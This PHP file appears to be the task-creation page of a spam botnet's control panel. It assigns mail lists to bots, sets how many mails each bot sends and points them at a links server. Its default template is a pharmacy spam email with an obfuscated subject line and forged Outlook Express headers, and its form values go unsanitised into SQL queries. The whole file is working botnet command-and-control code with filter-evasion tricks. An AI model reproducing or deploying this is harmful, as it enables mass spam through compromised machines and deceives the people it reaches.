<?
  require("passwd.inc");
  $bodys_dir = "../bodys/";
  $headers_dir = "../headers/";
  $lists_dir = "../lists/";
  $tasks_dir = "../tasks/";

  function get_int($file) {
    global $tasks_dir;
    $f = fopen($tasks_dir.$file,"r");
    if (!$f) return -1;
    $c = fread($f,100);
    fclose($f);
    return $c;
  }

  require("../cfg.php");
  $action = $_GET['action'];

?>

<html>
<head>
<title>Bot config</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>

<?

  if ($action === "add") {
    
    $name = $_POST['name'];
    $mpb1  = $_POST['lpr1'];
    $mpb2  = $_POST['lpr2'];
    $listid = $_POST['list'];
    $body = $_POST['t_body'];
    $links_server = $_POST['links_server'];
    $links = $_POST['links'];
    $ver = $_POST['ver'];

    if ($mpb1 < 2) $mpb1 = 2;
    if ($mpb2 > 500) $mpb2 = 500;

    $listres = @mysql_query("SELECT * FROM lists WHERE `id` = $listid;");
    if (!$listres) exit("Mail list not selected!");
    $list_file = mysql_result($listres,0,'file');
    $list_count = mysql_result($listres,0,'count');

    $bres = @mysql_query("SELECT * FROM tasks;");
    $bid = 0;
    for ($i=0; $i < mysql_num_rows($bres); $i++) if ($bid < mysql_result($bres,$i,'id')) $bid = mysql_result($bres,$i,'id');
    $bid++;

    echo $bid;

    $fp = fopen($tasks_dir.$bid, "w");
    fwrite ($fp, "0");
    fclose ($fp);

    $fp = fopen($bodys_dir.$bid, "w");
    fwrite ($fp, $body);
    fclose ($fp);

    @mysql_query("INSERT INTO tasks (id, name, body_id, list, list_size, lpr1, lpr2, status, links_server, links, ver, style)
            VALUES ('$bid','$name','$bid','$list_file','$list_count','$mpb1', '$mpb2', '1', '$links_server','$links', '$ver', '1');")
             or die("Can't create task.");

  }

  echo "<hr>\r\n";
  echo "<div align='center'><h2>New Task for 4xx version</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";
  echo "<SCRIPT>function ow(e) { newWindow=window.open(e); newWindow.focus(); }</SCRIPT>";
  
?>
  <form action='?action=add' method='POST'>
  <table align='CENTER' border="1">
  <tr><td><b>&nbsp;Task Name:</b></td><td><input name='name' type='TEXT'></td><tr>
  <tr><td><b>&nbsp;Mails per Bot min*:</b></td><td><input name='lpr1' type='TEXT' value='100'></td></tr>
  <tr><td><b>&nbsp;Mails per Bot max*:</b></td><td><input name='lpr2' type='TEXT' value='100'></td></tr>
  <tr><td><b>&nbsp;Links Server:</b></td><td><input name='links_server' type='TEXT' value='127.0.0.1'></td></tr>
  <tr><td><b>&nbsp;Links:</b></td><td><input name='links' type='TEXT'></td></tr>
  <tr><td><b>&nbsp;Bot version:</b></td><td><input name='ver' type='TEXT'></td></tr>
  </table>

  <br><br>
  
  <table border='1' align=center>
  <tr><td colspan='2'><b>Lists</b></td></tr>
  <tr><td>File</td><td>Count</td></tr>

<?
  $list = @mysql_query("SELECT * FROM lists;");
  
  for ($i=0; $i < @mysql_num_rows($list); $i++) {
      echo "<tr>";
      echo "<td><input type='RADIO' name='list' value='".mysql_result($list,$i,'id')."'>".mysql_result($list,$i,'file')."</td>";
      echo "<td>".mysql_result($list,$i,'count')."</td>";
      echo "</tr>";
  }
  
?>
  </table>
  <br><br>
  <b>Message template:</b><br>
  <textarea name='t_body' cols='120' rows='50' align=center>
Message-ID: <@@MESSAGE_ID>
From: "@@FROM_NAME" <@@FROM_EMAIL>
To: "@@TO_NAME" <@@TO_EMAIL>
Reply-To: @@FROM_EMAIL
Subject: %RND_DIGIT[3-9]  C-A-N-A-D-l-A-N   P-H-A-R-M-A-C-Y
Date: @@DATE
MIME-Version: 1.0
Content-Type: multipart/related;
	boundary="@@BOUNDARY"
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 6.00.2900.3138
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.3138

This is a multi-part message in MIME format.

--@@BOUNDARY
Content-Type: text/html;
	charset="windows-1251"
Content-Transfer-Encoding: 8bit

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dwindows-1251">
<META content=3D"MSHTML 6.00.2900.3138" name=3DGENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY bgcolor="#ffffff" text="#000000">
<!--<a href="%ADV_LINK"><img src="cid:000501c9562b.1f37c450.c54410d9@localhost"></a>-->
----====[HTML-TEXT]====----
</BODY>
</HTML>

--@@BOUNDARY
Content-Type: text/plain;
	charset="windows-1251"
Content-Transfer-Encoding: 8bit

----====[PLAIN-TEXT]====----

--@@BOUNDARY
Content-Type: image/jpeg; name="$A$A$A$A.jpg"
Content-Transfer-Encoding: base64
Content-ID: <000501c9562b.1f37c450.c54410d9@localhost>

----====[BASE64-IMAGE]====----

--@@BOUNDARY--

  </textarea>
  <br>
  <input type='SUBMIT' value='New Task'>
  </form>
